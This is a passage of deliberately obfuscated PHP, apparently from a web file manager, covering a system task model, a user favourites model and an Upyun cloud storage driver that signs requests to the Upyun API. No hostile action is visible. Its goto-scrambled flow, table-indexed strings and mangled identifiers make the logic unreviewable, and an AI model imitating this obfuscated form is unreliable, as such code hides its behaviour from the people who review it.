$_SERVER[ºÖÙÂŒäÉê‡]; $dİ¨È©“ê¦ = parent::listData(); $C°æÍÁÉä = array_to_keyvalue($dİ¨È©“ê¦, $eÃ³Ê÷‰¨[33], $eÃ³Ê÷‰¨[2087]); return empty($C°æÍÁÉä) ? 0 : max($C°æÍÁÉä) + 1; } private function filterAuth(&$C“óŞ‰îÜì) { $e»ÆÉÑĞƒ =& $_SERVER[ºÖÙÂŒäÉê‡]; $dÔ…Ì¬Ñù = array(); $B²¼«ĞùËŒ = array_filter(explode($e»ÆÉÑĞƒ[47], $C“óŞ‰îÜì)); foreach ($B²¼«ĞùËŒ as $C“óŞ‰îÜì) { $c©è˜“ô¹¦ = explode($e»ÆÉÑĞƒ[91], $C“óŞ‰îÜì); if ($c©è˜“ô¹¦[0] == $e»ÆÉÑĞƒ[1746] && $c©è˜“ô¹¦[1] != $e»ÆÉÑĞƒ[1026]) { $cí°®é†»õ = $c©è˜“ô¹¦[0] . $e»ÆÉÑĞƒ[91] . $c©è˜“ô¹¦[1] . $e»ÆÉÑĞƒ[2438]; if (!in_array($cí°®é†»õ, $B²¼«ĞùËŒ)) { $dÔ…Ì¬Ñù[] = $cí°®é†»õ; } } $dÔ…Ì¬Ñù[] = $C“óŞ‰îÜì; } $C“óŞ‰îÜì = implode($e»ÆÉÑĞƒ[47], $dÔ…Ì¬Ñù); } public function sort($B«œ¥ÛŒ, $dò±¥ÊÃ¤µ) { return parent::update($B«œ¥ÛŒ, $dò±¥ÊÃ¤µ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\56\164\141\x73\153\x4c\x69\x73\x74"; public $field = array("\x6e\141\155\x65", "\x74\171\160\x65", "\145\x76\x65\x6e\x74", "\164\x69\155\145", "\144\x65\163\143", "\x73\171\x73\164\x65\155", "\x65\156\x61\142\x6c\145", "\154\141\163\x74\x52\165\x6e", "\163\157\x72\164"); public function listData($Fßé†‘‡Ëê = false, $B³¶½æ¶ƒê = "\163\x6f\x72\x74", $e°­Š¸Ù„ = false) { return parent::listData($Fßé†‘‡Ëê, $B³¶½æ¶ƒê, $e°­Š¸Ù„); } public function add($Céä·µ„°) { $B½ô‘Î¿ß‹ =& $_SERVER[ºÖÙÂŒäÉê‡]; $d¢µ¶’®·± = $this->findByName($Céä·µ„°[$B½ô‘Î¿ß‹[28]]); if ($d¢µ¶’®·±) { return !1; } $Céä·µ„°[$B½ô‘Î¿ß‹[1368]] = 0; $Céä·µ„°[$B½ô‘Î¿ß‹[2087]] = $this->getSort(); return parent::insert($Céä·µ„°); } private function getSort() { $aÚÉÛªŠµ =& $_SERVER[ºÖÙÂŒäÉê‡]; $E‰§ãîõ¤› = parent::listData(); $E·œ‰î‡ˆ = array_to_keyvalue($E‰§ãîõ¤›, $aÚÉÛªŠµ[33], $aÚÉÛªŠµ[2087]); return empty($E·œ‰î‡ˆ) ? 0 : max($E·œ‰î‡ˆ) + 1; } public function update($F§Šâ‚èÊ, $DŠ®ˆëˆÂ) { $c¸³•À…Í =& $_SERVER[ºÖÙÂŒäÉê‡]; $cÄ·êë²¥¤ = $this->listData($F§Šâ‚èÊ); $C°ùò¿Àœ = $this->findByName($DŠ®ˆëˆÂ[$c¸³•À…Í[28]]); if (!$cÄ·êë²¥¤ || $C°ùò¿Àœ && $C°ùò¿Àœ[$c¸³•À…Í[372]] != $cÄ·êë²¥¤[$c¸³•À…Í[372]]) { return !1; } return parent::update($F§Šâ‚èÊ, $DŠ®ˆëˆÂ); } public function remove($d ”š„Ê‘, $FİïØîå’ = false) { $f¿‘ÜÁÏ§ =& $_SERVER[ºÖÙÂŒäÉê‡]; $eÅ¨¨±†ÏÀ = $this->listData($d ”š„Ê‘); if (!$eÅ¨¨±†ÏÀ) { return; } if (!$FİïØîå’ && $eÅ¨¨±†ÏÀ[$f¿‘ÜÁÏ§[1070]] == $f¿‘ÜÁÏ§[83]) { return !1; } return parent::remove($d ”š„Ê‘); } public function enable($C÷‰×Øˆğâ, $dœ›è•Å¯İ) { return $this->update($C÷‰×Øˆğâ, array($_SERVER[ºÖÙÂŒäÉê‡][2429] => $dœ›è•Å¯İ)); } public function run($DÛ²ç„¥‚ù) { return $this->update($DÛ²ç„¥‚ù, array($_SERVER[ºÖÙÂŒäÉê‡][2439] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($A’ÂéÄÚ´Ğ) { $c¾óÏ‚©õ© =& $_SERVER[ºÖÙÂŒäÉê‡]; return array($c¾óÏ‚©õ©[2440] => array(USER_ID, $c¾óÏ‚©õ©[2441])); } protected function listData() { $dÓÕÒ½òïˆ =& $_SERVER[ºÖÙÂŒäÉê‡]; $C®ƒ©Œ–¼¢ = array($dÓÕÒ½òïˆ[1394] => USER_ID, $dÓÕÒ½òïˆ[440] => 0); $D áˆ”ë×‚ = $dÓÕÒ½òïˆ[2442]; $aÓÀß¢Ûó› = $this->field($D áˆ”ë×‚)->where($C®ƒ©Œ–¼¢)->order($dÓÕÒ½òïˆ[2443])->select(); return $aÓÀß¢Ûó› ? $aÓÀß¢Ûó› : array(); } protected function resetCache() { } protected function listView() { goto CÏ„É££Ä; f²¯«¸’Äğ: $C‰î™å…Ë = array_to_keyvalue($C‰î™å…Ë, $c´•İ›É£¥[374]); foreach ($d…“¾ò¾‰¼ as $bŒ§­ººÀ  => $DÊ©¹‹Ñ) { $CŞŒ¬í·® = $C‰î™å…Ë[$DÊ©¹‹Ñ[$c´•İ›É£¥[75]]]; $CŞŒ¬í·® = $CŞŒ¬í·® ? $CŞŒ¬í·® : array(); $d…“¾ò¾‰¼[$bŒ§­ººÀ ] = array_merge($CŞŒ¬í·®, $DÊ©¹‹Ñ); } return $d…“¾ò¾‰¼; goto dÈíŸîÈ; EŠÑœÍ¶ßÛ: $C“¶Œòá = array_to_keyvalue($C‡Ëˆƒ¦×, $c´•İ›É£¥[33], $c´•İ›É£¥[75]); if (!$C“¶Œòá) { return $d…“¾ò¾‰¼; } $Cµ¿ªœ—Á´ = 2000; goto FĞ¡§ê°¾¼; CÏ„É££Ä: $c´•İ›É£¥ =& $_SERVER[ºÖÙÂŒäÉê‡]; $d…“¾ò¾‰¼ = $this->listData(); $C‡Ëˆƒ¦× = array_filter_by_field($d…“¾ò¾‰¼, $c´•İ›É£¥[29], $c´•İ›É£¥[387]); goto EŠÑœÍ¶ßÛ; FĞ¡§ê°¾¼: $e· ®õ³ğê = array($c´•İ›É£¥[388] => array($c´•İ›É£¥[389], $C“¶Œòá)); $C‰î™å…Ë = Model($c´•İ›É£¥[751])->listSource($e· ®õ³ğê, $Cµ¿ªœ—Á´); $C‰î™å…Ë = array_merge($C‰î™å…Ë[$c´•İ›É£¥[73]], $C‰î™å…Ë[$c´•İ›É£¥[74]]); goto f²¯«¸’Äğ; dÈíŸîÈ: } protected function addFav($EƒÇÃåéš, $c²ğ¼£Ğ©ƒ = '', $b„Ûä“ˆò• = "\163\157\165\x72\143\145") { goto A÷œÜóçÌ; déÉ²³°è: return $this->add($a¹ÅòõíÓ„); goto eºáÇö¥Â›; C’à’âˆ÷İ: if (!$c²ğ¼£Ğ©ƒ && $b„Ûä“ˆò• == $DõÕ‘Œ°„á[387]) { $A¸Ü¸µ†İ¤ = Model($DõÕ‘Œ°„á[1100])->where(array($DõÕ‘Œ°„á[388] => $EƒÇÃåéš))->find(); if (!$A¸Ü¸µ†İ¤) { return !1; } $c²ğ¼£Ğ©ƒ = $A¸Ü¸µ†İ¤[$DõÕ‘Œ°„á[28]]; } $c²ğ¼£Ğ©ƒ = $this->getAutoName($c²ğ¼£Ğ©ƒ); $a¹ÅòõíÓ„ = array($DõÕ‘Œ°„á[1394] => USER_ID, $DõÕ‘Œ°„á[440] => 0, $DõÕ‘Œ°„á[391] => $c²ğ¼£Ğ©ƒ, $DõÕ‘Œ°„á[392] => $EƒÇÃåéš, $DõÕ‘Œ°„á[393] => $b„Ûä“ˆò•, $DõÕ‘Œ°„á[2070] => $fõ×ò»Èš– + 1); goto déÉ²³°è; A÷œÜóçÌ: $DõÕ‘Œ°„á =& $_SERVER[ºÖÙÂŒäÉê‡]; $E²¥éœÃå­ = array($DõÕ‘Œ°„á[1394] => USER_ID, $DõÕ‘Œ°„á[440] => 0, $DõÕ‘Œ°„á[393] => $b„Ûä“ˆò•, $DõÕ‘Œ°„á[392] => $EƒÇÃåéš); if ($this->where($E²¥éœÃå­)->find()) { return !1; } goto aìê´Ú¾‡; aìê´Ú¾‡: $E²¥éœÃå­ = array($DõÕ‘Œ°„á[1394] => USER_ID, $DõÕ‘Œ°„á[440] => 0); $fõ×ò»Èš– = $this->where($E²¥éœÃå­)->max($DõÕ‘Œ°„á[2087]); if (!$fõ×ò»Èš–) { $fõ×ò»Èš– = 0; } goto C’à’âˆ÷İ; eºáÇö¥Â›: } protected function remove($A‚Ùå™ÑÌ) { $eæÍŞ’œ›Ş =& $_SERVER[ºÖÙÂŒäÉê‡]; $cò¦Ñƒ¸êÅ = array($eæÍŞ’œ›Ş[1394] => USER_ID, $eæÍŞ’œ›Ş[390] => $A‚Ùå™ÑÌ); return $this->where($cò¦Ñƒ¸êÅ)->delete(); } protected function removeByName($c…ÆÌ×–”) { $Bó®Œ‚­ =& $_SERVER[ºÖÙÂŒäÉê‡]; $dê„Ø÷‰—© = array($Bó®Œ‚­[1394] => USER_ID, $Bó®Œ‚­[391] => $c…ÆÌ×–”, $Bó®Œ‚­[440] => 0); return $this->where($dê„Ø÷‰—©)->delete(); } protected function rename($DÒ÷ ÆÉôš, $E±ˆŒÌçä) { $EÛÃ¾–¬†’ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($DÒ÷ ÆÉôš == $E±ˆŒÌçä) { return !1; } $BÏ±ÎïÅÂ = $this->getAutoName($E±ˆŒÌçä); if ($E±ˆŒÌçä != $BÏ±ÎïÅÂ) { return !1; } $aÄ¡¤…Í‹ = array($EÛÃ¾–¬†’[1394] => USER_ID, $EÛÃ¾–¬†’[440] => 0, $EÛÃ¾–¬†’[28] => $DÒ÷ ÆÉôš); return $this->where($aÄ¡¤…Í‹)->save(array($EÛÃ¾–¬†’[28] => $E±ˆŒÌçä)); } protected function resetSort($AÒÛ—Ã) { $c‡í®Á°ˆ® =& $_SERVER[ºÖÙÂŒäÉê‡]; $AÒÛ—Ã = is_array($AÒÛ—Ã) ? $AÒÛ—Ã : array(); $b¾–öÒğÃ = array($c‡í®Á°ˆ®[1394] => USER_ID); for ($fùÙÏ†³¸ç = 0; $fùÙÏ†³¸ç < count($AÒÛ—Ã); $fùÙÏ†³¸ç++) { $b¾–öÒğÃ[$c‡í®Á°ˆ®[390]] = $AÒÛ—Ã[$fùÙÏ†³¸ç]; $this->where($b¾–öÒğÃ)->save(array($c‡í®Á°ˆ®[2070] => $fùÙÏ†³¸ç + 1)); } return !0; } protected function moveTop($Cä‚£É”±Ç) { goto C”Ù¯´Š˜¦; C”Ù¯´Š˜¦: $CŠ©¿Öô™ =& $_SERVER[ºÖÙÂŒäÉê‡]; $FŠùğø¯— = array($CŠ©¿Öô™[1394] => USER_ID, $CŠ©¿Öô™[440] => 0); $aÅİ¢ˆ¿œ’ = $this->where($FŠùğø¯—)->where(array($CŠ©¿Öô™[28] => $Cä‚£É”±Ç))->find(); goto eôïŠ³èò‘; E²—°¨ÎÙí: $d«ƒâ£Ş = $Eµñèùäæ; $Eµñèùäæ = array_remove_value($Eµñèùäæ, $aÅİ¢ˆ¿œ’[$CŠ©¿Öô™[372]]); array_unshift($Eµñèùäæ, $aÅİ¢ˆ¿œ’[$CŠ©¿Öô™[372]]); goto b¾À°©»¯×; eôïŠ³èò‘: if (!$aÅİ¢ˆ¿œ’) { return; } $Eµñèùäæ = $this->field($CŠ©¿Öô™[372])->where($FŠùğø¯—)->order($CŠ©¿Öô™[2443])->select(); $Eµñèùäæ = array_to_keyvalue($Eµñèùäæ, $CŠ©¿Öô™[33], $CŠ©¿Öô™[372]); goto E²—°¨ÎÙí; b¾À°©»¯×: return $this->resetSort($Eµñèùäæ); goto e‹á¤»çáë; e‹á¤»çáë: } protected function moveBottom($A¿™áò¸Á“) { $cÒšÜ“ç–Ø =& $_SERVER[ºÖÙÂŒäÉê‡]; $f†ß´ÃÈ… = array($cÒšÜ“ç–Ø[1394] => USER_ID, $cÒšÜ“ç–Ø[440] => 0); $E…¥‘åô²ò = $this->where($f†ß´ÃÈ…)->max($cÒšÜ“ç–Ø[2087]); $dïäàãÂ = array($cÒšÜ“ç–Ø[2087] => $E…¥‘åô²ò + 1); return $this->where($f†ß´ÃÈ…)->where(array($cÒšÜ“ç–Ø[28] => $A¿™áò¸Á“))->save($dïäàãÂ); } private function getAutoName($fäª×Êš“—) { goto A±©¶µ; f¥Š†ê­ò—: $AÎ©«—†Îƒ = array_to_keyvalue($AÎ©«—†Îƒ, $dø ¹Š×Ã‰[33], $dø ¹Š×Ã‰[28]); if (!$AÎ©«—†Îƒ || !in_array($fäª×Êš“—, $AÎ©«—†Îƒ)) { return $fäª×Êš“—; } for ($D‡¡¡‰‰ö‹ = 0; $D‡¡¡‰‰ö‹ < count($AÎ©«—†Îƒ); $D‡¡¡‰‰ö‹++) { if (!in_array($fäª×Êš“— . "\50{$D‡¡¡‰‰ö‹}\51", $AÎ©«—†Îƒ)) { return $fäª×Êš“— . "\50{$D‡¡¡‰‰ö‹}\51"; } } goto a†‡ĞÎÛĞ; A±©¶µ: $dø ¹Š×Ã‰ =& $_SERVER[ºÖÙÂŒäÉê‡]; $BĞâ£šÂ›Ñ = array($dø ¹Š×Ã‰[1394] => USER_ID, $dø ¹Š×Ã‰[440] => 0); $AÎ©«—†Îƒ = $this->field($dø ¹Š×Ã‰[28])->where($BĞâ£šÂ›Ñ)->select(); goto f¥Š†ê­ò—; a†‡ĞÎÛĞ: return $fäª×Êš“— . "\x28{$D‡¡¡‰‰ö‹}\x29"; goto AŒš™ˆ±Ä; AŒš™ˆ±Ä: } } goto E³¡–çßÓÏ; F„ßå¸›’Ø: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\160\72\57\57\x76\x30\56\x61\x70\x69\x2e\x75\160\171\165\x6e\x2e\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($e›ÛÊ†·×ù) { parent::__construct(); $this->_init($e›ÛÊ†·×ù); } public function _init($CÄÆÙÒƒŠÔ) { foreach ($CÄÆÙÒƒŠÔ as $d½¹¼ÆÅç“ => $aœÄ‡–Ù) { if (isset($this->{$d½¹¼ÆÅç“})) { $this->{$d½¹¼ÆÅç“} = $aœÄ‡–Ù; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[ºÖÙÂŒäÉê‡][1223], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($B¹íĞ§Á²ë, $F§µ„ñÎ› = "\107\105\x54") { $AÆ†³Àæçô =& $_SERVER[ºÖÙÂŒäÉê‡]; $A½Óò­ó“Î = gmdate($AÆ†³Àæçô[1187]); $F±®´°®‡‰ = base64_encode(hash_hmac($AÆ†³Àæçô[1224], "{$F§µ„ñÎ›}\46{$B¹íĞ§Á²ë}\46{$A½Óò­ó“Î}", md5("{$this->userpass}"), !0)); $AàÁ”šç»ï = array("\101\x75\164\150\x6f\162\x69\172\141\164\x69\157\156\x3a\x55\x50\x59\x55\116\40{$this->username}\x3a{$F±®´°®‡‰}", "\104\x61\164\145\72{$A½Óò­ó“Î}"); return $AàÁ”šç»ï; } public function ussRequest($E­†¢„´Ï, $fáƒÏÍ´Ò› = "\x47\x45\124", $Fí®Ë´¼Û÷ = false, $f‹¡ÅÈğ×í = false, $d“†İƒÕ‡õ = false) { goto A±ŞÆâ»‚†; C†‘£óã˜ï: if (!$d™¶ÔŒ) { return array($e…ÓáÉ„«³[1022] => !1, $e…ÓáÉ„«³[1024] => $e…ÓáÉ„«³[1225]); } if (strtolower($fáƒÏÍ´Ò›) == $e…ÓáÉ„«³[190] || in_array($d™¶ÔŒ[$e…ÓáÉ„«³[1022]], array($e…ÓáÉ„«³[1083], $e…ÓáÉ„«³[1226]))) { $Fí®Ë´¼Û÷ = $d™¶ÔŒ[$e…ÓáÉ„«³[1227]]; } else { $Fí®Ë´¼Û÷ = json_decode($d™¶ÔŒ[$e…ÓáÉ„«³[1024]], !0); if (!$Fí®Ë´¼Û÷) { $Fí®Ë´¼Û÷ = $d™¶ÔŒ[$e…ÓáÉ„«³[1024]]; } else { if (!$d™¶ÔŒ[$e…ÓáÉ„«³[686]] && isset($Fí®Ë´¼Û÷[$e…ÓáÉ„«³[1228]])) { $Fí®Ë´¼Û÷ = $Fí®Ë´¼Û÷[$e…ÓáÉ„«³[1228]]; } } } return array($e…ÓáÉ„«³[1022] => $d™¶ÔŒ[$e…ÓáÉ„«³[686]], $e…ÓáÉ„«³[1024] => $Fí®Ë´¼Û÷); goto A¡Í¹¼’Œò; A±ŞÆâ»‚†: $e…ÓáÉ„«³ =& $_SERVER[ºÖÙÂŒäÉê‡]; $E­†¢„´Ï = trim($E­†¢„´Ï, $e…ÓáÉ„«³[8]); $Dæˆòòàğ¯ = "\x2f{$this->bucket}\57{$E­†¢„´Ï}"; goto a—­§ˆİ‚´; a—­§ˆİ‚´: $D™ÊàÒÎÁ = $this->ussHeaders($Dæˆòòàğ¯, $fáƒÏÍ´Ò›); if ($f‹¡ÅÈğ×í) { $D™ÊàÒÎÁ = array_merge($D™ÊàÒÎÁ, $f‹¡ÅÈğ×í); } $d™¶ÔŒ = url_request($this->endpoint . $Dæˆòòàğ¯, $fáƒÏÍ´Ò›, $Fí®Ë´¼Û÷, $D™ÊàÒÎÁ, $d“†İƒÕ‡õ); goto C†‘£óã˜ï; A¡Í¹¼’Œò: } public function mkfile($fÁ¡ £¢êÚ, $B¨³š­ß¹“ = '', $Bİ†Ë…¯ğç = REPEAT_RENAME) { if ($this->setContent($fÁ¡ £¢êÚ, $B¨³š­ß¹“)) { return $this->getPathOuter($fÁ¡ £¢êÚ); } return !1; } public function mkdir($d¹¼Š…¡¡, $f‡©˜ï´òî = REPEAT_SKIP) { $D·ÓÊæ†Åİ =& $_SERVER[ºÖÙÂŒäÉê‡]; $bÈŒá˜°Ò‘ = trim($d¹¼Š…¡¡, $D·ÓÊæ†Åİ[8]); if ($this->_isFolder($bÈŒá˜°Ò‘)) { return $this->getPathOuter($bÈŒá˜°Ò‘); } $F´ÈÜÌ¾İÀ = array($D·ÓÊæ†Åİ[1229]); $DÛÈùŠÙ¥ = $this->ussRequest($bÈŒá˜°Ò‘, $D·ÓÊæ†Åİ[218], !1, $F´ÈÜÌ¾İÀ); return $DÛÈùŠÙ¥[$D·ÓÊæ†Åİ[1022]] ? $this->getPathOuter($bÈŒá˜°Ò‘) : !1; } public function copyFile($f‘¡áİÚ½, $BËÎ¡±ÕÈ) { $A†’­µÎÃ– =& $_SERVER[ºÖÙÂŒäÉê‡]; $Eô‹ôŒ×© = array($A†’­µÎÃ–[1230] . "\x2f{$this->bucket}\57{$f‘¡áİÚ½}", $A†’­µÎÃ–[1231]); $aÚ‡íêäÇ¨ = $this->ussRequest($BËÎ¡±ÕÈ, $A†’­µÎÃ–[220], !1, $Eô‹ôŒ×©); return $aÚ‡íêäÇ¨[$A†’­µÎÃ–[1022]] ? !0 : !1; } public function moveFile($a×¹±ØÓÕ, $cñ­Õù«ñ–) { $AçË‡áŸª– =& $_SERVER[ºÖÙÂŒäÉê‡]; $Cº´™‘á…ç = array($AçË‡áŸª–[1232] . "\x2f{$this->bucket}\57{$a×¹±ØÓÕ}", $AçË‡áŸª–[1231]); $A÷Ú²¨§Ò = $this->ussRequest($cñ­Õù«ñ–, $AçË‡áŸª–[220], !1, $Cº´™‘á…ç); return $A÷Ú²¨§Ò[$AçË‡áŸª–[1022]] ? !0 : !1; } public function delFile($cÒ†—Á¬¥) { $BŸÈŠÛØÁ  =& $_SERVER[ºÖÙÂŒäÉê‡]; $Dƒ‘Õ½˜¥  = $this->ussRequest($cÒ†—Á¬¥, $BŸÈŠÛØÁ [1233]); return $Dƒ‘Õ½˜¥ [$BŸÈŠÛØÁ [1022]] ? !0 : !1; } public function delFolder($c¯«ó˜Ö§) { $D‰İÕĞç² =& $_SERVER[ºÖÙÂŒäÉê‡]; $e÷ÇİÖ‚Õ¯ = $this->listAll($c¯«ó˜Ö§); krsort($e÷ÇİÖ‚Õ¯); foreach ($e÷ÇİÖ‚Õ¯ as $F¾†’„…á¾) { $this->ussRequest($F¾†’„…á¾[$D‰İÕĞç²[75]], $D‰İÕĞç²[1233]); } return $this->ussRequest($c¯«ó˜Ö§, $D‰İÕĞç²[1233]); } public function rename($fÄ„ç‡ÏÇ†, $b°¬Ö§íß) { if ($this->isFile($fÄ„ç‡ÏÇ†)) { $b°¬Ö§íß = get_path_father($fÄ„ç‡ÏÇ†) . $b°¬Ö§íß; return $this->moveFile($fÄ„ç‡ÏÇ†, $b°¬Ö§íß); } return $this->renameObject($fÄ„ç‡ÏÇ†, $b°¬Ö§íß); } public function fileInfo($F¶ŸÈĞ£Ä, $bÎØÚë°õ = false, $F·àÖ×¦ˆ¬ = array()) { $d‘ÔËÈ©© =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($bÎØÚë°õ) { return array($d‘ÔËÈ©©[28] => $this->pathThis($F¶ŸÈĞ£Ä), $d‘ÔËÈ©©[75] => $this->getPathOuter($d‘ÔËÈ©©[8] . $F¶ŸÈĞ£Ä), $d‘ÔËÈ©©[29] => $d‘ÔËÈ©©[163], $d‘ÔËÈ©©[77] => isset($F·àÖ×¦ˆ¬[$d‘ÔËÈ©©[330]]) ? $F·àÖ×¦ˆ¬[$d‘ÔËÈ©©[330]] : 0, $d‘ÔËÈ©©[156] => $this->ext($F¶ŸÈĞ£Ä)); } $bÁ¤¢é‹è‘ = array($d‘ÔËÈ©©[28] => $this->pathThis($F¶ŸÈĞ£Ä), $d‘ÔËÈ©©[75] => $this->getPathOuter($d‘ÔËÈ©©[8] . $F¶ŸÈĞ£Ä), $d‘ÔËÈ©©[29] => $d‘ÔËÈ©©[163], $d‘ÔËÈ©©[193] => 0, $d‘ÔËÈ©©[106] => isset($b‰ŸìÕ‰¦ğ[$d‘ÔËÈ©©[1234]]) ? $b‰ŸìÕ‰¦ğ[$d‘ÔËÈ©©[1234]] : 0, $d‘ÔËÈ©©[77] => isset($F·àÖ×¦ˆ¬[$d‘ÔËÈ©©[330]]) ? $F·àÖ×¦ˆ¬[$d‘ÔËÈ©©[330]] : 0, $d‘ÔËÈ©©[156] => $this->ext($F¶ŸÈĞ£Ä), $d‘ÔËÈ©©[194] => !0, $d‘ÔËÈ©©[195] => !0); if (empty($F·àÖ×¦ˆ¬)) { $F·àÖ×¦ˆ¬ = $this->objectMeta($F¶ŸÈĞ£Ä); if (!$F·àÖ×¦ˆ¬) { return $bÁ¤¢é‹è‘; } $bÁ¤¢é‹è‘[$d‘ÔËÈ©©[193]] = $F·àÖ×¦ˆ¬[$d‘ÔËÈ©©[1235]]; $bÁ¤¢é‹è‘[$d‘ÔËÈ©©[106]] = $F·àÖ×¦ˆ¬[$d‘ÔËÈ©©[1236]]; $bÁ¤¢é‹è‘[$d‘ÔËÈ©©[77]] = $F·àÖ×¦ˆ¬[$d‘ÔËÈ©©[77]]; } return $bÁ¤¢é‹è‘; } public function folderInfo($bÁë©·Ì»ë, $Eìîù“ÛŠÌ = false) { $F˜†ê›µí‘ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($Eìîù“ÛŠÌ) { return array($F˜†ê›µí‘[28] => $this->pathThis($bÁë©·Ì»ë), $F˜†ê›µí‘[75] => $this->getPathOuter($F˜†ê›µí‘[8] . $bÁë©·Ì»ë), $F˜†ê›µí‘[29] => $F˜†ê›µí‘[76]); } $b­£‚¡ä = array($F˜†ê›µí‘[28] => $this->pathThis($bÁë©·Ì»ë), $F˜†ê›µí‘[75] => $this->getPathOuter($F˜†ê›µí‘[8] . $bÁë©·Ì»ë), $F˜†ê›µí‘[29] => $F˜†ê›µí‘[76], $F˜†ê›µí‘[193] => 0, $F˜†ê›µí‘[106] => isset($Bº¨‰‘ê±¦[$F˜†ê›µí‘[1234]]) ? $Bº¨‰‘ê±¦[$F˜†ê›µí‘[1234]] : 0, $F˜†ê›µí‘[1144] => !0, $F˜†ê›µí‘[1145] => !0); if (empty($dÊƒë±ÚŠÕ)) { $dÊƒë±ÚŠÕ = $this->objectMeta($bÁë©·Ì»ë); if (!$dÊƒë±ÚŠÕ) { return $b­£‚¡ä; } $b­£‚¡ä[$F˜†ê›µí‘[193]] = $dÊƒë±ÚŠÕ[$F˜†ê›µí‘[1235]]; $b­£‚¡ä[$F˜†ê›µí‘[106]] = $dÊƒë±ÚŠÕ[$F˜†ê›µí‘[1236]]; } return $b­£‚¡ä; } private function fileList($a¶‹®Ï×á½, $A–„Öâš©é = 0, $FˆÏëŞé”£ = 1000) { $c¢¹ëƒÙ£™ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Fï¡«àÒ•– = array($c¢¹ëƒÙ£™[1237], $c¢¹ëƒÙ£™[1238] . $FˆÏëŞé”£); if ($A–„Öâš©é) { $Fï¡«àÒ•–[] = $c¢¹ëƒÙ£™[1239] . $A–„Öâš©é; } $bñ½ñŞ­ŸÒ = $this->ussRequest($a¶‹®Ï×á½, $c¢¹ëƒÙ£™[222], !1, $Fï¡«àÒ•–); return !$bñ½ñŞ­ŸÒ[$c¢¹ëƒÙ£™[1022]] ? !1 : $bñ½ñŞ­ŸÒ[$c¢¹ëƒÙ£™[1024]]; } public function listPath($D¹¼‹‰¹É, $fÜî°Ü = false) { goto F³«àøå±; aœ×ÙŞ‹ùä: return array($BÉ‡£½Ø“[74] => $c¤”ÕÖíÀù, $BÉ‡£½Ø“[73] => $bß ³‘ÂãÕ); goto C†£·¨£Ğ×; dà˜ÃÄÉÔÇ: $c¤”ÕÖíÀù = $bß ³‘ÂãÕ = array(); $F¨ªçÓĞ = rtrim($D¹¼‹‰¹É, $BÉ‡£½Ø“[8]) . $BÉ‡£½Ø“[8]; while (!0) { $aîŠãÈÀ— = $this->fileList($D¹¼‹‰¹É, $fğõŠ¤™ï, $fïğÆñé); if (!$aîŠãÈÀ—) { return !1; } $fğõŠ¤™ï = isset($aîŠãÈÀ—[$BÉ‡£½Ø“[1240]]) ? $aîŠãÈÀ—[$BÉ‡£½Ø“[1240]] : $BÉ‡£½Ø“[33]; $CÚÌ¦í‰§« = isset($aîŠãÈÀ—[$BÉ‡£½Ø“[1241]]) ? $aîŠãÈÀ—[$BÉ‡£½Ø“[1241]] : array(); foreach ($CÚÌ¦í‰§« as $aˆ®”‰¿ô™) { if ($aˆ®”‰¿ô™[$BÉ‡£½Ø“[29]] == $BÉ‡£½Ø“[76]) { $c¤”ÕÖíÀù[] = $this->folderInfo($F¨ªçÓĞ . $aˆ®”‰¿ô™[$BÉ‡£½Ø“[28]], $fÜî°Ü, $aˆ®”‰¿ô™); } else { $bß ³‘ÂãÕ[] = $this->fileInfo($F¨ªçÓĞ . $aˆ®”‰¿ô™[$BÉ‡£½Ø“[28]], $fÜî°Ü, $aˆ®”‰¿ô™); } } if (count($CÚÌ¦í‰§«) < $fïğÆñé) { break; } } goto aœ×ÙŞ‹ùä; F³«àøå±: $BÉ‡£½Ø“ =& $_SERVER[ºÖÙÂŒäÉê‡]; $fğõŠ¤™ï = $BÉ‡£½Ø“[33]; $fïğÆñé = 1000; goto dà˜ÃÄÉÔÇ; C†£·¨£Ğ×: } private function recursionAllFiles($b¼ÜËà†, &$A™ìÙ¨¡ÑÇ) { $f‡†¯ô–óĞ =& $_SERVER[ºÖÙÂŒäÉê‡]; $C‰‡ôÃÇç‹ = $f‡†¯ô–óĞ[33]; $c–à˜íÎ’é = 1000; $EÑµ“İÉ–Å = $AÍ¹»§•§ = array(); $eÕøÉ¨ƒŒ = rtrim($b¼ÜËà†, $f‡†¯ô–óĞ[8]) . $f‡†¯ô–óĞ[8]; while (!0) { $BµòÌ¿›®š = $this->fileList($b¼ÜËà†, $C‰‡ôÃÇç‹, $c–à˜íÎ’é); if (!$BµòÌ¿›®š) { return !1; } $C‰‡ôÃÇç‹ = isset($BµòÌ¿›®š[$f‡†¯ô–óĞ[1240]]) ? $BµòÌ¿›®š[$f‡†¯ô–óĞ[1240]] : $f‡†¯ô–óĞ[33]; $b”ß…á‹ö÷ = isset($BµòÌ¿›®š[$f‡†¯ô–óĞ[1241]]) ? $BµòÌ¿›®š[$f‡†¯ô–óĞ[1241]] : array(); foreach ($b”ß…á‹ö÷ as $B§Ñã„­) { $d …¬å±áã = array($f‡†¯ô–óĞ[75] => $eÕøÉ¨ƒŒ . $B§Ñã„­[$f‡†¯ô–óĞ[28]], $f‡†¯ô–óĞ[76] => $B§Ñã„­[$f‡†¯ô–óĞ[29]] == $f‡†¯ô–óĞ[76] ? 1 : 0, $f‡†¯ô–óĞ[77] => isset($B§Ñã„­[$f‡†¯ô–óĞ[330]]) ? $B§Ñã„­[$f‡†¯ô–óĞ[330]] : 0); $A™ìÙ¨¡ÑÇ[] = $d …¬å±áã; if ($d …¬å±áã[$f‡†¯ô–óĞ[76]] == 1) { $this->recursionAllFiles($d …¬å±áã[$f‡†¯ô–óĞ[75]], $A™ìÙ¨¡ÑÇ); } } if (count($b”ß…á‹ö÷) < $c–à˜íÎ’é) { break; } } } public function has($Däê§«ğŸå, $BÕ±Š„Ğîª = false, $a¼Îìœ×È = true) { goto E¼õ™Á½¤÷; 